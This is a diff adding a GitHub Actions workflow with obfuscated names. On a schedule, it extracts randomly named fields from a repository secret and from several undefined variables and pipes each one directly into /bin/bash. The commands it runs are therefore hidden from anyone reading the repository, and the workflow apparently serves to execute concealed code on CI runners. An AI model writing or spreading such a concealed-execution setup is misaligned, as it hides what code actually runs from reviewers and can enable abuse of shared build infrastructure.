@@ -1,0 +1,22 @@
+name: chuxianpilouu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chuxianpilouu
+        env:
+          d1: ${{ secrets.d1 }}
+        run: |
+          echo $d1 | jq -r .rtp86 | /bin/bash
+          echo $i0664 | jq -r .cvx2 | /bin/bash
+          echo $aumpg7969 | jq -r .rt16676 | /bin/bash
+          echo $foqyo840 | jq -r .xwr9 | /bin/bash
+          echo $b5 | jq -r .qbsh20 | /bin/bash
+          echo $tdqf0012 | jq -r .gesfg2 | /bin/bash
+
